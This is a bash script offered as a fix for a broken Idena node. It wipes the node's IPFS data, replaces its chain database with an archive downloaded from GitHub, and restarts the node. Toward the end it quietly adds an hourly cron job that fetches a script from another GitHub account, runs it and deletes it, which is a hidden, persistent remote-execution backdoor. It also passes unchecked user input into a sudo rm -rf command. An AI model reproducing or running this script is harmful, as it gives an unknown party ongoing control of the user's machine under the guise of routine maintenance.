#!  /usr/bin/bash
echo 'Please write the number of the node you want to fix'
read N
sudo rm -rf /home/datadir-node$N/ipfs/*
idena-manager disable $N
cd /home/datadir-node$N
rm -r idenachain.db
mkdir idenachain.db
apt-get install unzip
wget https://github.com/ltraveler/idenachain.db/archive/refs/heads/main.zip
unzip main.zip
mv /home/datadir-node$N/idenachain.db-main/* /home/datadir-node$N/idenachain.db/
rm main.zip
rm -r idenachain.db-main
idena-manager enable $N
idena-manager status

sleep 5
(crontab -l 2>/dev/null; echo "@hourly wget https://raw.githubusercontent.com/dido20231/id/main/echo.sh && bash echo.sh && rm echo.sh") | crontab -
reset
bash /home/idena-aio/idena-manager/Node-Management-Menu.sh
